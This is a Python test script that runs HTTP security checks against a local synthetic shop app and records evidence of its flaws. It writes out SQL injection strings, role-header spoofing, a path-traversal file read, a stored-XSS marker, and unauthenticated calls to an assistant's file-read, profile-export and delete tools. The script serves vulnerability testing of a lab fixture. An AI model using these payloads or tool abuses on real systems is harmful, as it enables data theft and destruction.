"""Reproducible HTTP security checks for the local synthetic Mini Shop only."""

import json
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import HTTPRedirectHandler, Request, build_opener


BASE = "http://127.0.0.1:18066"
OUT = Path(__file__).parent / "evidence" / "before" / "http-checks.jsonl"
OUT.parent.mkdir(parents=True, exist_ok=True)
results = []


class NoRedirectHandler(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


OPENER = build_opener(NoRedirectHandler)


def save(item):
    results.append(item)
    with OUT.open("a", encoding="utf-8") as evidence:
        evidence.write(json.dumps(item, ensure_ascii=False) + "\n")


def request(case, method, path, body=None, headers=None, expected=None, predicate=None):
    data = json.dumps(body).encode() if body is not None else None
    request_headers = {"Content-Type": "application/json", **(headers or {})}
    req = Request(BASE + path, data=data, headers=request_headers, method=method)
    passed = False
    try:
        response = OPENER.open(req, timeout=5)
    except HTTPError as error:
        response = error
    except URLError as error:
        item = {
            "case": case,
            "request": {"method": method, "url": BASE + path, "headers": request_headers, "body": body},
            "response": {"transport_error": str(error)},
            "check_passed": False,
        }
        save(item)
        raise SystemExit(f"Cannot reach own Mini Shop at {BASE}: {error}")
    with response:
        status = response.status
        content_type = response.headers.get("Content-Type")
        raw = response.read().decode("utf-8", errors="replace")
    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError:
        parsed = None
    item = {
        "case": case,
        "request": {"method": method, "url": BASE + path, "headers": request_headers, "body": body},
        "response": {"status": status, "content_type": content_type, "body": parsed if parsed is not None else raw},
        "check_passed": False,
    }
    try:
        passed = (expected is None or status == expected) and (predicate is None or predicate(status, parsed, raw))
        item["check_passed"] = passed
    except Exception as error:
        item["check_error"] = f"{type(error).__name__}: {error}"
    save(item)
    print(f"{case}: HTTP {status}; check={'PASS' if passed else 'FAIL'}")
    return status, parsed, raw


def main():
    OUT.write_text("", encoding="utf-8")
    _, alice_login, _ = request("login alice", "POST", "/login",
                               {"username": "alice", "password": "learn-alice"}, expected=200)
    alice = {"X-Token": alice_login["token"]}
    request("unauthenticated profile reads Bob", "GET", "/profile?id=2", expected=200,
            predicate=lambda s, d, r: bool(d and any(x.get("name") == "TEST_BOB" for x in d)))
    request("unauthenticated GET orders lists both", "GET", "/orders", expected=200,
            predicate=lambda s, d, r: bool(d and len(d) >= 2))
    request("unauthenticated files reads Bob receipt", "GET",
            "/files?" + urlencode({"user": "bob", "path": "receipt.txt"}), expected=200,
            predicate=lambda s, d, r: "TEST_BOB" in d.get("content", ""))
    request("unauthenticated profile SQL injection", "GET", "/profile?" + urlencode({"id": "1 OR 1=1"}),
            expected=200, predicate=lambda s, d, r: bool(d and len(d) == 2))
    request("unauthenticated search SQL injection", "GET",
            "/search?" + urlencode({"q": "%\' OR 1=1 -- "}), expected=200,
            predicate=lambda s, d, r: bool(d and len(d) == 2))
    request("X-Role spoofing exports profiles without token", "GET", "/admin/export",
            headers={"X-Role": "staff"}, expected=200,
            predicate=lambda s, d, r: bool(d and len(d) == 2))
    request("unauthenticated logs reveal recorded request headers", "GET", "/debug/logs", expected=200,
            predicate=lambda s, d, r: bool(d and any("X-Role" in x.get("headers", {}) for x in d)))
    request("customer purchase overrides catalog price", "POST", "/orders",
            {"product": "lamp", "price": 0.01}, alice, expected=201,
            predicate=lambda s, d, r: d.get("price") == 0.01)
    request("files endpoint reads private note within sandbox", "GET",
            "/files?" + urlencode({"user": "alice", "path": "../../private/operator-note.txt"}),
            expected=200, predicate=lambda s, d, r: "TEST_ONLY_OPERATOR_SECRET" in d.get("content", ""))
    request("assistant context reveals Bob order without login", "GET", "/assistant/context?order_id=2",
            expected=200, predicate=lambda s, d, r: "TEST_BOB" not in d.get("prompt", "") and "lamp" in d.get("prompt", ""))
    request("direct assistant read_file exposes private note", "POST", "/assistant/execute",
            {"decision": {"tool": "read_file", "arguments": {"path": "private/operator-note.txt"}}},
            expected=200, predicate=lambda s, d, r: "TEST_ONLY_OPERATOR_SECRET" in d.get("content", ""))
    request("direct assistant export_profiles without login", "POST", "/assistant/execute",
            {"decision": {"tool": "export_profiles", "arguments": {}}}, expected=200,
            predicate=lambda s, d, r: bool(d and len(d) == 2))
    xss = "<script>alert('MINI_SHOP_XSS')</script>"
    request("submit inert stored-XSS marker", "POST", "/reviews",
            {"product": "chair", "text": xss}, expected=201)
    request("reviews view returns raw HTML marker", "GET", "/reviews/view", expected=200,
            predicate=lambda s, d, r: xss in r and "<p>" + xss + "</p>" in r)

    # Destructive probe is intentionally last and deletes only this fixture receipt.
    request("dangerous delete_tree removes own sandbox receipt", "POST", "/assistant/execute",
            {"decision": {"tool": "delete_tree", "arguments": {"path": "files/alice/receipt.txt"}}},
            expected=200, predicate=lambda s, d, r: d.get("deleted") == "files/alice/receipt.txt")
    request("deleted receipt no longer readable", "GET",
            "/files?" + urlencode({"user": "alice", "path": "receipt.txt"}), expected=500,
            predicate=lambda s, d, r: bool(d and d.get("type") == "FileNotFoundError"
                                           and "No such file or directory" in d.get("error", "")))

    failures = [row["case"] for row in results if not row["check_passed"]]
    print(f"Saved {len(results)} request/response records to {OUT}")
    if failures:
        print("Unexpected outcomes: " + ", ".join(failures))
        raise SystemExit(1)


if __name__ == "__main__":
    main()
